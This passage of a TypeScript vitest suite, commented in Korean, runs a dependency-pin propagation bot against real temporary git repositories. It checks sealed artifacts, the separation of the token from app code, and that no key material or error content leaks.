import { spawnSync } from "node:child_process";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  lstatSync,
  mkdtempSync,
  readdirSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { beforeEach, describe, expect, it } from "vitest";

/**
 * `scripts/propagate/propagate.sh` 시나리오 시험 — 계획서 Task 3(설계서 §6 D1·D2),
 * 2026-09-08 리뷰 R2 로 **clone → prepare → push 세 단계**가 된 뒤의 판.
 *
 * ★이 봇이 하는 일: 공용 보관함에 커밋이 올라가면 앱 3곳(ERP·일루아·랩)의
 *  `@wedly/policy-match-shared` 핀을 새 SHA 로 올려 커밋·푸시한다. 사람이 손으로 맞추던 일이다.
 *
 * ★단계를 나눈 이유(리뷰 R2 · 여기서 실제로 재는 것):
 *  토큰을 쥔 자리에서 앱 코드를 돌리지 않는다. `prepare` 는 토큰 없이 npm·후처리를 돌려
 *  **파일만** 산출물 폴더에 담고, `push` 는 새로 클론해 그 파일을 얹어 밀기만 한다.
 *  그래서 「push 단계가 npm 을 한 번도 부르지 않는다」가 시험 항목이다 —
 *  그 줄이 빨개지면 앱 코드가 다시 토큰 옆으로 돌아온 것이다.
 *
 * ★그래서 이 시험이 막는 사고들:
 *  1) 핀만 올리고 잠금 파일이 옛 SHA 로 남는 것(= 새 핀인데 옛 코드로 배포)
 *  2) 순서가 뒤집혀 핀이 **뒤로 가는** 것(늦게 도착한 옛 반영이 새 핀을 덮어씀)
 *  3) 봇이 핀 말고 **다른 파일까지** 커밋하는 것
 *  4) 준비와 밀기 사이에 사람이 민 커밋을 **잃는** 것(다른 파일이면 rebase 로 살리고, 같은 파일이면 멈춘다)
 *  5) 토큰이 화면·산출물에 새는 것
 *
 * ★재는 방식: 글자 대조가 아니라 **진짜 스크립트를 진짜 git 저장소에서 돌린다.**
 *  - 가짜 패키지 저장소(c1→c2→c3, 곁가지 x1)로 「후손인가」 판정을 실제 `merge-base` 로 시킨다
 *  - 가짜 앱 저장소는 bare 원격까지 만들어 **진짜 푸시**를 받는다(커밋이 원격에 남았는지로 판정)
 *  - `npm` 만 PATH 앞의 shim 으로 바꾼다(네트워크·설치 시간 없이 잠금 파일 갱신을 흉내)
 *  - 단계마다 **다른 npm 기록 파일·다른 GITHUB_OUTPUT** 을 줘 어느 단계가 무엇을 했는지 따로 잰다
 *
 * ★`__dirname` 대신 `fileURLToPath(import.meta.url)`: 이 보관함은 `"type": "module"`(ESM).
 * ★git 설정을 `/dev/null` 로 격리: 사람의 전역 설정(`core.hooksPath`·`commit.gpgsign` 등)이
 *  시험 결과를 바꾸면 안 된다.
 */

const HERE = dirname(fileURLToPath(import.meta.url));
const SCRIPT = resolve(HERE, "../propagate.sh");
const LIB = resolve(HERE, "../lib.sh");
const REPO = "smlee-hash/wedly-policy-match-shared";
const SPEC = (sha: string) => `github:${REPO}#${sha}`;
const RESOLVED = (sha: string) => `git+ssh://git@github.com/${REPO}.git#${sha}`;

/** 시험용 git 은 사람의 전역·시스템 설정을 읽지 않는다 */
const HERMETIC_GIT = {
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_SYSTEM: "/dev/null",
  GIT_TERMINAL_PROMPT: "0",
};

function sh(cmd: string, cwd: string, env: NodeJS.ProcessEnv = {}) {
  const r = spawnSync("bash", ["-c", cmd], {
    cwd,
    encoding: "utf8",
    env: { ...process.env, ...HERMETIC_GIT, ...env },
  });
  if (r.status !== 0) throw new Error(`${cmd}\n${r.stdout}\n${r.stderr}`);
  return r.stdout.trim();
}

/**
 * 산출물 봉인(2026-09-08 총괄 결정 F9)에 쓸 RSA 키쌍 — **시험이 스스로** 임시 폴더에 만든다.
 * 저장소·PC 의 실제 열쇠는 쓰지 않는다(시험이 비밀값을 만지지 않게).
 */
function makeKeys(label: string) {
  const dir = mkdtempSync(join(tmpdir(), `propagate-keys-${label}-`));
  const priv = join(dir, "priv.pem");
  const pub = join(dir, "pub.pem");
  sh(
    `openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "${priv}" 2>/dev/null && ` +
      `openssl pkey -in "${priv}" -pubout -out "${pub}"`,
    dir,
  );
  return { privPem: readFileSync(priv, "utf8"), pubPem: readFileSync(pub, "utf8") };
}

const KEYS = makeKeys("main");
/** 짝이 아닌 열쇠 — 「남의 비밀키로는 못 푼다」를 재는 데 쓴다 */
const OTHER_KEYS = makeKeys("other");

/**
 * 산출물을 **봇 코드를 부르지 않고** 같은 규격으로 봉인한다.
 * ★시험이 규격을 스스로 다시 만드는 이유: 봇이 만든 것을 봇이 푸는 것만 재면 규격이 틀려도 초록이다.
 *  그리고 이 함수의 존재 자체가 봉인의 성질을 말한다 — 공개키는 누구나 아는 값이라 **누구나 그럴듯한
 *  산출물을 지어낼 수 있다.** 봉인은 「엿보기」만 막고 위조는 못 막으므로, 밀기 단계는 봉인을 푼 뒤에도
 *  내용을 전부 다시 본다(그 판정을 재는 시험들이 아래에 있다).
 */
function sealInto(destDir: string, plainDir: string, pubPem: string) {
  const work = mkdtempSync(join(tmpdir(), "propagate-seal-"));
  writeFileSync(join(work, "pub.pem"), pubPem);
  rmSync(destDir, { recursive: true, force: true });
  mkdirSync(destDir, { recursive: true });
  sh(
    [
      `openssl rand -hex 32 > "${work}/session.key"`,
      `tar czf "${work}/bundle.tgz" -C "${plainDir}" .`,
      `openssl enc -aes-256-cbc -pbkdf2 -pass file:"${work}/session.key" -in "${work}/bundle.tgz" -out "${destDir}/bundle.enc"`,
      `openssl pkeyutl -encrypt -pubin -inkey "${work}/pub.pem" -pkeyopt rsa_padding_mode:oaep ` +
        `-in "${work}/session.key" -out "${destDir}/key.enc"`,
    ].join(" && "),
    work,
  );
  rmSync(work, { recursive: true, force: true });
  return destDir;
}

/**
 * 봉인 규격은 그대로 두되 **꾸러미 자리에 tar 가 아닌 것**을 넣는다(4차 리뷰 H1 의 「tar 오류」 경우).
 * 열쇠는 진짜 공개키로 봉인하므로 `pkeyutl -decrypt` 와 `enc -d` 는 통과하고 tar 에서만 죽는다.
 */
function sealRawInto(destDir: string, raw: string, pubPem: string) {
  const work = mkdtempSync(join(tmpdir(), "propagate-sealraw-"));
  writeFileSync(join(work, "pub.pem"), pubPem);
  writeFileSync(join(work, "raw.bin"), raw);
  rmSync(destDir, { recursive: true, force: true });
  mkdirSync(destDir, { recursive: true });
  sh(
    [
      `openssl rand -hex 32 > "${work}/session.key"`,
      `openssl enc -aes-256-cbc -pbkdf2 -pass file:"${work}/session.key" -in "${work}/raw.bin" -out "${destDir}/bundle.enc"`,
      `openssl pkeyutl -encrypt -pubin -inkey "${work}/pub.pem" -pkeyopt rsa_padding_mode:oaep ` +
        `-in "${work}/session.key" -out "${destDir}/key.enc"`,
    ].join(" && "),
    work,
  );
  rmSync(work, { recursive: true, force: true });
  return destDir;
}

/** 폴더 안의 **모든 항목**(폴더 포함)을 상대 경로로 훑는다 — 「지웠는가」는 파일만 봐서는 못 잰다 */
function walkAll(dir: string, prefix = ""): string[] {
  if (!existsSync(dir)) return [];
  const out: string[] = [];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const rel = `${prefix}${e.name}`;
    if (e.isDirectory()) {
      out.push(`${rel}/`);
      out.push(...walkAll(join(dir, e.name), `${rel}/`));
    } else {
      out.push(rel);
    }
  }
  return out.sort();
}

/**
 * 임시 폴더에 **열쇠 재료가 한 조각도 안 남았는지** 잰다(2026-09-08 4차 리뷰 H1 · P2).
 * 재는 것 셋: ① `propagate-crypto.*` 작업 폴더가 남지 않았다 ② `*.pem`·`session.key` 가 없다
 * ③ 남아 있는 어떤 파일에도 비밀키 본문(`PRIVATE KEY`)이 없다.
 */
function expectNoKeyLeftovers(dir: string, where: string) {
  const left = walkAll(dir);
  expect(left.filter((p) => p.includes("propagate-crypto")), `${where}: 봉인 작업 폴더가 남았습니다 — ${left.join(" ")}`)
    .toEqual([]);
  expect(
    left.filter((p) => /\.pem$|session\.key$/.test(p)),
    `${where}: 열쇠 파일이 남았습니다 — ${left.join(" ")}`,
  ).toEqual([]);
  for (const rel of left) {
    if (rel.endsWith("/")) continue;
    const full = join(dir, rel);
    if (!lstatSync(full).isFile()) continue;
    expect(readFileSync(full).toString("latin1"), `${where}: ${rel} 안에 비밀키가 남아 있습니다`).not.toContain(
      "PRIVATE KEY",
    );
  }
}

/** 봉인된 산출물을 풀어 평문 폴더 경로를 돌려준다 — 시험이 안을 들여다볼 때 쓴다 */
function unsealFrom(sealedDir: string, privPem: string): string {
  const work = mkdtempSync(join(tmpdir(), "propagate-unseal-"));
  const plain = join(work, "plain");
  mkdirSync(plain, { recursive: true });
  writeFileSync(join(work, "priv.pem"), privPem);
  sh(
    [
      `openssl pkeyutl -decrypt -inkey "${work}/priv.pem" -pkeyopt rsa_padding_mode:oaep ` +
        `-in "${sealedDir}/key.enc" -out "${work}/session.key"`,
      `openssl enc -d -aes-256-cbc -pbkdf2 -pass file:"${work}/session.key" -in "${sealedDir}/bundle.enc" -out "${work}/bundle.tgz"`,
      `tar xzf "${work}/bundle.tgz" -C "${plain}"`,
    ].join(" && "),
    work,
  );
  return plain;
}

/** 준비 단계가 올린 **봉인 산출물**을 풀어 그 안을 본다 */
function openArtifact(tmp: string) {
  return unsealFrom(join(tmp, "artifact"), KEYS.privPem);
}

/** 가짜 패키지 저장소: c1 → c2 → c3 (main), 갈래 x1(c1 에서 딴 것) */
function fakePackage(tmp: string) {
  const dir = join(tmp, "pkg");
  mkdirSync(dir, { recursive: true });
  sh("git init -q -b main && git config user.email t@t && git config user.name t", dir);
  const commit = (n: string) => {
    writeFileSync(join(dir, "f.txt"), n);
    sh(`git add . && git commit -qm "${n}"`, dir);
    return sh("git rev-parse HEAD", dir);
  };
  const c1 = commit("c1");
  const c2 = commit("c2");
  const c3 = commit("c3");
  sh(`git checkout -q -b side ${c1}`, dir);
  const x1 = commit("x1");
  sh("git checkout -q main", dir);
  return { dir, c1, c2, c3, x1 };
}

/** 가짜 앱: package.json·package-lock 핀 = pinSha, bare 원격 포함 */
function fakeApp(tmp: string, name: string, pinSha: string, extra?: (work: string) => void) {
  const work = join(tmp, `${name}-seed`);
  mkdirSync(work, { recursive: true });
  writeFileSync(
    join(work, "package.json"),
    JSON.stringify({ name, dependencies: { "@wedly/policy-match-shared": SPEC(pinSha) } }, null, 2) + "\n",
  );
  writeFileSync(
    join(work, "package-lock.json"),
    JSON.stringify(
      {
        lockfileVersion: 3,
        packages: {
          "": { dependencies: { "@wedly/policy-match-shared": SPEC(pinSha) } },
          "node_modules/@wedly/policy-match-shared": { resolved: RESOLVED(pinSha), integrity: "sha512-seed" },
        },
      },
      null,
      2,
    ) + "\n",
  );
  writeFileSync(join(work, ".gitignore"), "node_modules\n");
  writeFileSync(join(work, "README.md"), "app\n");
  extra?.(work);
  sh("git init -q -b main && git config user.email t@t && git config user.name t && git add . && git commit -qm seed", work);
  const bare = join(tmp, `${name}.git`);
  sh(`git clone -q --bare "${work}" "${bare}"`, tmp);
  return { work, bare };
}

/**
 * 사람이 앱 저장소에 직접 미는 상황 — **준비와 밀기 사이**의 경합을 만든다.
 * 봇의 push 단계는 그때 이미 옛 커밋(baseSha) 위에 얹으므로 푸시가 거부되고 rebase 로 이어진다.
 */
function humanPush(tmp: string, bare: string, edit: (dir: string) => void, message: string) {
  const dir = join(tmp, `human-${Math.random().toString(36).slice(2)}`);
  sh(`git clone -q "${bare}" "${dir}"`, tmp);
  sh("git config user.email h@t && git config user.name 사람", dir);
  edit(dir);
  sh(`git add -A && git commit -qm "${message}" && git push -q origin HEAD:main`, dir);
}

/**
 * 가짜 npm: `pkg set` 은 package.json 을 실제로 고치고, `install` 은 잠금 파일을 새 SHA 로 고친다.
 * `ci` 는 설치 잠금(node_modules/.package-lock.json)을 쓴다. `run` 은 **진짜 npm 과 같은 뜻으로**
 * package.json 의 `scripts` 를 읽어 그 문자열을 셸로 돌린다(`A && B` 묶음도 그대로).
 * 그 밖의 부명령은 실패(9)로 알린다 — 스크립트가 예상 밖 npm 호출을 하면 조용히 넘어가지 않게.
 *
 * ★`run` 이 필요한 이유: 봇의 ERP 후처리가 `npm run design:check` 다(apps.json). Railway 가 ERP
 *  `build` 첫 단계로 돌리는 바로 그 명령이라 봇도 같은 것을 돌려야 한다. 여기서 `run` 을 흉내만 내고
 *  아무것도 실행하지 않으면 「봇 시험은 초록인데 Railway 는 빨간」 상태를 시험이 못 잡는다.
 */
function fakeNpm(tmp: string) {
  const bin = join(tmp, "bin");
  mkdirSync(bin, { recursive: true });
  const npm = join(bin, "npm");
  writeFileSync(
    npm,
    `#!/usr/bin/env bash
set -e
log="$FAKE_NPM_LOG"; echo "npm $*" >> "$log"
# 시험용 스위치: FAKE_NPM_FAIL 에 적힌 부명령은 npm 처럼 큰 종료 코드로 죽는다(진짜 npm 은 128 도 낸다)
if [ -n "$FAKE_NPM_FAIL" ] && [ "$1" = "$FAKE_NPM_FAIL" ]; then
  echo "fake npm: $1 을(를) 일부러 실패시켰습니다" >&2
  exit 128
fi
case "$1" in
  pkg) node -e '
    const fs = require("fs");
    const arg = process.argv[1];
    const at = arg.indexOf("=");
    const k = arg.slice(0, at), v = arg.slice(at + 1);
    const keys = k.split(".");
    const p = JSON.parse(fs.readFileSync("package.json", "utf8"));
    p[keys[0]][keys.slice(1).join(".")] = v;
    fs.writeFileSync("package.json", JSON.stringify(p, null, 2) + "\\n");' "$3" ;;
  install) node -e '
    const fs = require("fs");
    const p = JSON.parse(fs.readFileSync("package.json", "utf8"));
    const spec = p.dependencies["@wedly/policy-match-shared"];
    const sha = spec.split("#")[1];
    const l = JSON.parse(fs.readFileSync("package-lock.json", "utf8"));
    l.packages[""].dependencies["@wedly/policy-match-shared"] = spec;
    l.packages["node_modules/@wedly/policy-match-shared"] = {
      resolved: "git+ssh://git@github.com/smlee-hash/wedly-policy-match-shared.git#" + sha,
      integrity: "sha512-" + sha.slice(0, 8),
    };
    fs.writeFileSync("package-lock.json", JSON.stringify(l, null, 2) + "\\n");' ;;
  ci) node -e '
    const fs = require("fs");
    const l = JSON.parse(fs.readFileSync("package-lock.json", "utf8"));
    fs.mkdirSync("node_modules", { recursive: true });
    fs.writeFileSync("node_modules/.package-lock.json", JSON.stringify({
      packages: { "node_modules/@wedly/policy-match-shared": l.packages["node_modules/@wedly/policy-match-shared"] },
    }));' ;;
  run)
    # package.json 의 scripts 에서 명령 문자열을 꺼내 셸로 돌린다(진짜 npm 과 같은 동작).
    # 없는 script 면 진짜 npm 처럼 1 로 죽는다 — set -e 가 여기서 스크립트를 멈춘다.
    CMD="$(node -e '
      const fs = require("fs");
      const name = process.argv[1];
      const s = (JSON.parse(fs.readFileSync("package.json", "utf8")).scripts || {})[name];
      if (!s) { console.error("fake npm: Missing script: " + name); process.exit(1); }
      process.stdout.write(s);' "$2")"
    bash -c "$CMD" ;;
  *) echo "fake npm: unknown $1" >&2; exit 9 ;;
esac
`,
  );
  chmodSync(npm, 0o755);
  return bin;
}

interface StepRun {
  code: number | null;
  stdout: string;
  stderr: string;
  /** 그 단계가 GITHUB_OUTPUT 에 적은 것 */
  out: string;
  /** 그 단계가 부른 npm 기록(줄마다 한 번) */
  npmLog: string;
}

let stepCounter = 0;
/** H1 시험이 TMPDIR 를 시험마다 새 폴더로 못 박을 때 쓰는 번호 */
let pinnedTmpCounter = 0;

/** `propagate.sh <단계>` 를 한 번 돌린다. 단계마다 기록 파일을 따로 준다. */
function runStep(tmp: string, step: "clone" | "prepare" | "push", env: Record<string, string>): StepRun {
  const stamp = `${step}-${(stepCounter += 1)}`;
  const npmLog = join(tmp, `npm-${stamp}.log`);
  const outFile = join(tmp, `github-output-${stamp}.txt`);
  writeFileSync(npmLog, "");
  writeFileSync(outFile, "");
  const r = spawnSync("bash", [SCRIPT, step], {
    encoding: "utf8",
    env: {
      ...process.env,
      ...HERMETIC_GIT,
      PATH: `${fakeNpm(tmp)}:${process.env.PATH}`,
      FAKE_NPM_LOG: npmLog,
      FAKE_NPM_FAIL: "",
      PROPAGATE_WORKDIR: join(tmp, "work"),
      PROPAGATE_OUT: join(tmp, "artifact"),
      PROPAGATE_SUBJECT: "feat: 시험 커밋",
      PROPAGATE_PACKAGE_URL: "https://example.test/pkg/commit",
      PROPAGATE_RUN_URL: "https://example.test/run/1",
      PROPAGATE_TOKEN: "",
      // 산출물 봉인(F9) — 준비는 공개키로 봉인하고 밀기는 비밀키로 푼다. 시험이 만든 키쌍이다.
      PROPAGATE_ARTIFACT_PUBKEY: KEYS.pubPem,
      PROPAGATE_ARTIFACT_PRIVKEY: KEYS.privPem,
      GITHUB_OUTPUT: outFile,
      ...env,
    },
  });
  return {
    code: r.status,
    stdout: r.stdout,
    stderr: r.stderr,
    out: readFileSync(outFile, "utf8"),
    npmLog: readFileSync(npmLog, "utf8"),
  };
}

/** clone → prepare (실패하면 거기서 멈춘다) */
function runPrepare(tmp: string, env: Record<string, string>) {
  const clone = runStep(tmp, "clone", env);
  if (clone.code !== 0) return { clone, prepare: undefined };
  return { clone, prepare: runStep(tmp, "prepare", env) };
}

/** clone → prepare → push (앞 단계가 실패하면 거기서 멈춘다) */
function runAll(tmp: string, env: Record<string, string>) {
  const { clone, prepare } = runPrepare(tmp, env);
  if (!prepare || prepare.code !== 0) return { clone, prepare, push: undefined };
  return { clone, prepare, push: runStep(tmp, "push", env) };
}

/** 산출물 폴더에 담긴 파일 목록(상대 경로) */
function listFiles(dir: string, prefix = ""): string[] {
  return readdirSync(dir, { withFileTypes: true })
    .flatMap((e) => (e.isDirectory() ? listFiles(join(dir, e.name), `${prefix}${e.name}/`) : [`${prefix}${e.name}`]))
    .sort();
}

/**
 * ERP 의 `design:check` script 흉내 — **두 명령의 묶음**이다(실제 ERP package.json, 2026-09-08 실측:
 * `node scripts/design-system/cli.mjs check && node scripts/design-system/debt.mjs check`).
 * 봇은 `npm run design:check` 로 이 묶음을 통째로 돌리므로, 가짜 앱도 같은 모양이어야
 * 「Railway 와 같은 명령을 돌린다」를 시험이 실제로 잰다.
 */
function seedErpScripts(work: string) {
  const pkgPath = join(work, "package.json");
  const pkg = JSON.parse(readFileSync(pkgPath, "utf8")) as Record<string, unknown>;
  pkg.scripts = {
    ...((pkg.scripts as Record<string, string> | undefined) ?? {}),
    "design:check": "node scripts/design-system/cli.mjs check && node scripts/design-system/debt.mjs check",
  };
  writeFileSync(pkgPath, JSON.stringify(pkg, null, 2) + "\n");
  mkdirSync(join(work, "scripts/design-system"), { recursive: true });
  // 빚(debt) 검사는 이 시험의 관심사가 아니다 — 있기만 하면 된다(묶음의 뒷 절반이 실제로 돈다는 증거).
  writeFileSync(join(work, "scripts/design-system/debt.mjs"), "// 빚 검사 흉내 — 늘 통과\n");
}

/** ERP 흉내: 설계 등록부 + 가짜 cli.mjs(generate 는 현재 핀을 적고, check 는 그것이 핀과 같은지 본다) */
function seedErpDesignSystem(work: string, cliBody?: string) {
  seedErpScripts(work);
  mkdirSync(join(work, "scripts/design-system"), { recursive: true });
  mkdirSync(join(work, "src/lib/design-system"), { recursive: true });
  writeFileSync(join(work, "src/lib/design-system/registry.generated.json"), '{"pin":"old"}\n');
  writeFileSync(
    join(work, "scripts/design-system/cli.mjs"),
    cliBody ??
      `import { readFileSync, writeFileSync } from "node:fs";
const cmd = process.argv[2];
const pin = JSON.parse(readFileSync("package.json", "utf8")).dependencies["@wedly/policy-match-shared"];
if (cmd === "generate") writeFileSync("src/lib/design-system/registry.generated.json", JSON.stringify({ pin }) + "\\n");
else if (cmd === "check") {
  if (JSON.parse(readFileSync("src/lib/design-system/registry.generated.json", "utf8")).pin !== pin) {
    console.error("stale");
    process.exit(1);
  }
} else process.exit(2);
`,
  );
}

/**
 * 준비 단계를 거치지 않고 **산출물을 손으로 지어** 밀기 단계만 시험한다.
 *
 * ★왜 필요한가(2026-09-08 2차 리뷰의 위협 모델): 준비 job 에서 도는 앱 코드는 믿을 수 없다 —
 *  실행기의 파일도 산출물도 마음대로 바꿀 수 있다. 그러니 밀기 단계는 산출물을 **믿을 수 없는 입력**
 *  으로 다뤄야 한다. 그 판정을 재려면 「준비가 만들 리 없는 산출물」을 시험이 직접 지어야 한다.
 */
function writeArtifact(
  tmp: string,
  meta: Record<string, string>,
  files: Record<string, string>,
  pubPem: string = KEYS.pubPem,
) {
  const plain = mkdtempSync(join(tmpdir(), "propagate-fake-artifact-"));
  writeFileSync(join(plain, "meta.json"), JSON.stringify(meta, null, 2) + "\n");
  for (const [rel, body] of Object.entries(files)) {
    mkdirSync(dirname(join(plain, rel)), { recursive: true });
    writeFileSync(join(plain, rel), body);
  }
  // 밀기 단계가 받는 것은 늘 **봉인된** 산출물이다(F9) — 시험도 같은 모양으로 건넨다.
  const outDir = sealInto(join(tmp, "artifact"), plain, pubPem);
  rmSync(plain, { recursive: true, force: true });
  return outDir;
}

/** `fakeApp` 이 심은 것과 같은 모양의 package.json — 핀만 다른 판 */
function pkgJsonAt(name: string, sha: string) {
  return JSON.stringify({ name, dependencies: { "@wedly/policy-match-shared": SPEC(sha) } }, null, 2) + "\n";
}

/** 가짜 npm 의 `install` 이 만드는 것과 같은 모양의 잠금 파일 */
function lockJsonAt(sha: string, integrity = `sha512-${sha.slice(0, 8)}`) {
  return (
    JSON.stringify(
      {
        lockfileVersion: 3,
        packages: {
          "": { dependencies: { "@wedly/policy-match-shared": SPEC(sha) } },
          "node_modules/@wedly/policy-match-shared": { resolved: RESOLVED(sha), integrity },
        },
      },
      null,
      2,
    ) + "\n"
  );
}

/**
 * H2 시험이 쓰는 표식 — **비밀이 아니다**(이름 그대로). 깨진 JSON 의 **첫 글자부터** 어긋나게 둔다:
 * V8 은 그때 입력 앞부분을 오류문에 담기 때문이다(가운데가 깨지면 위치만 적고 내용은 안 적는다).
 */
const CANARY = "PRIVATE_REVIEW_CANARY_NOT_A_SECRET";
const BROKEN_JSON = `${CANARY} 이 줄은 JSON 이 아니다\n`;

/**
 * 「JSON 구문 오류는 고정 문구로만 적는다」를 잰다(2026-09-08 4차 리뷰 H2 확장 · P2).
 * 표식도, 그 앞 9글자도 stdout·stderr 어디에도 없어야 하고 대신 고정 문구가 있어야 한다.
 */
function expectNoJsonLeak(r: StepRun, where: string) {
  const all = `${r.stdout}\n${r.stderr}`;
  expect(r.code, all).toBe(1);
  expect(all, `${where}: 표식이 그대로 실렸습니다`).not.toContain(CANARY);
  expect(all, `${where}: 표식의 앞부분이 실렸습니다`).not.toContain(CANARY.slice(0, 9));
  expect(all, `${where}: 고정 문구가 없습니다`).toContain("JSON 구문 오류(내용은 표시하지 않음)");
}

describe("propagate.sh", () => {
  let tmp: string;
  let pkg: ReturnType<typeof fakePackage>;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "propagate-"));
    mkdirSync(join(tmp, "work"), { recursive: true });
    pkg = fakePackage(tmp);
  }, 60_000);

  it("잠금 파일만 쓰는 앱(lab): 핀 갱신 → 커밋 → 푸시, 커밋 저자는 봇", () => {
    const app = fakeApp(tmp, "lab", pkg.c1);
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code, r.prepare?.stderr).toBe(0);
    expect(r.prepare?.out).toContain("result=prepared");
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.out).toContain("result=updated");
    expect(r.push?.out).toContain(`commit=${sh("git rev-parse main", app.bare)}`);
    expect(sh("git log -1 --format=%s main", app.bare)).toBe(
      `chore(정책매칭 공용): 핀 ${pkg.c3.slice(0, 7)} — feat: 시험 커밋`,
    );
    expect(sh("git log -1 --format='%an <%ae>' main", app.bare)).toBe("WEDLY 정책매칭 봇 <policy-bot@wedly.kr>");
    expect(sh("git log -1 --format=%b main", app.bare)).toContain("https://example.test/pkg/commit");
    expect(sh("git show main:package.json", app.bare)).toContain(SPEC(pkg.c3));
    expect(sh("git show main:package-lock.json", app.bare)).toContain(RESOLVED(pkg.c3));
    expect(r.prepare?.npmLog).not.toMatch(/^npm ci/m);
  }, 60_000);

  it("설치 앱(erp): npm ci 와 후처리(postSteps)를 돌리고 등록부 파일까지 커밋한다", () => {
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => seedErpDesignSystem(w));
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.push?.out).toContain("result=updated");
    expect(r.prepare?.npmLog).toMatch(/^npm ci --ignore-scripts/m);
    // 후처리 두 번째 단계는 Railway 가 ERP `build` 첫 단계로 돌리는 것과 **같은 명령**이어야 한다.
    expect(r.prepare?.npmLog).toMatch(/^npm run design:check$/m);
    expect(sh("git show main:src/lib/design-system/registry.generated.json", app.bare)).toContain(pkg.c3);
    expect(sh("git show --stat --format= main", app.bare)).toMatch(/registry\.generated\.json/);
  }, 60_000);

  it("push 단계는 npm 을 한 번도 부르지 않는다 — 토큰 옆에서 앱 코드가 돌지 않는다는 증거", () => {
    // 리뷰 R2 의 핵심. ERP 는 준비 단계에서 npm 을 여러 번 부르는 앱이라 대비가 분명하다.
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => seedErpDesignSystem(w));
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.push?.code, r.push?.stderr).toBe(0);
    expect(r.prepare?.npmLog.trim().split("\n").length).toBeGreaterThan(2); // 준비 단계는 실제로 npm 을 쓴다
    expect(r.push?.npmLog).toBe(""); // 밀기 단계는 한 줄도 없다
    expect(r.clone.npmLog).toBe(""); // 클론 단계도 마찬가지
  }, 60_000);

  it("준비 단계 산출물에는 commitPaths 와 meta.json 만 담긴다", () => {
    const app = fakeApp(tmp, "erp", pkg.c1, (w) => seedErpDesignSystem(w));
    const baseSha = sh("git rev-parse main", app.bare);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code, r.prepare?.stderr).toBe(0);
    // 올리는 폴더에는 **봉인 두 장만** 있고(F9), 평문은 봉인 안에 있다
    expect(listFiles(join(tmp, "artifact"))).toEqual(["bundle.enc", "key.enc"]);
    const outDir = openArtifact(tmp);
    expect(listFiles(outDir)).toEqual([
      "meta.json",
      "package-lock.json",
      "package.json",
      "src/lib/design-system/registry.generated.json",
    ]);
    const meta = JSON.parse(readFileSync(join(outDir, "meta.json"), "utf8")) as Record<string, string>;
    expect(meta).toEqual({
      app: "erp",
      result: "prepared",
      baseSha, // 밀기 단계는 이 커밋 위에 얹는다
      pinFrom: pkg.c1,
      pinTo: pkg.c3,
      subject: "feat: 시험 커밋",
    });
    // 담긴 파일은 실제로 새 핀이 든 파일이어야 한다(빈 껍데기 산출물 방지)
    expect(readFileSync(join(outDir, "package.json"), "utf8")).toContain(SPEC(pkg.c3));
    expect(readFileSync(join(outDir, "package-lock.json"), "utf8")).toContain(RESOLVED(pkg.c3));
  }, 60_000);

  it("설계 등록부가 핀과 어긋나면 `npm run design:check` 가 막는다 — 아무것도 밀지 않는다", () => {
    // 왜 이 시험이 있나: 이것이 봇의 「Railway 와 같은 관문」이다. 등록부 재생성이 깨져 옛 값이
    // 남으면 Railway 의 `npm run design:check` 가 빨개져 **배포가 실패**한다. 봇은 그런 커밋을
    // 애초에 만들지 않아야 한다.
    const app = fakeApp(tmp, "erp", pkg.c1, (w) =>
      seedErpDesignSystem(
        w,
        `import { readFileSync, writeFileSync } from "node:fs";
const cmd = process.argv[2];
const pin = JSON.parse(readFileSync("package.json", "utf8")).dependencies["@wedly/policy-match-shared"];
// generate 가 낡은 값을 적는다(등록부 재생성이 깨진 상황)
if (cmd === "generate") writeFileSync("src/lib/design-system/registry.generated.json", JSON.stringify({ pin: "stale" }) + "\\n");
else if (cmd === "check") {
  if (JSON.parse(readFileSync("src/lib/design-system/registry.generated.json", "utf8")).pin !== pin) {
    console.error("설계 등록부가 핀과 다릅니다");
    process.exit(1);
  }
} else process.exit(2);
`,
      ),
    );
    const before = sh("git rev-parse main", app.bare);
    const r = runPrepare(tmp, {
      PROPAGATE_APP_ID: "erp",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code).toBe(1);
    expect(r.prepare?.stderr).toMatch(/후처리 실패: npm run design:check/);
    expect(sh("git rev-parse main", app.bare)).toBe(before);
  }, 60_000);

  it("같은 SHA 면 skipped-same — 준비도 밀기도 아무것도 하지 않는다", () => {
    const app = fakeApp(tmp, "lab", pkg.c3);
    const before = sh("git rev-parse main", app.bare);
    const r = runAll(tmp, {
      PROPAGATE_APP_ID: "lab",
      PROPAGATE_SHA: pkg.c3,
      PROPAGATE_PACKAGE_DIR: pkg.dir,
      PROPAGATE_CLONE_URL: app.bare,
    });
    expect(r.prepare?.code, r.prepare?.stderr).toBe(0);
    expect(r.prepare?.out).toContain("result=skipped-same");
    // 건너뛴 경우에도 meta.json 은 담긴다 — 밀기 단계가 그 이유를 그대로 이어받는다(봉인 안에 한 장)
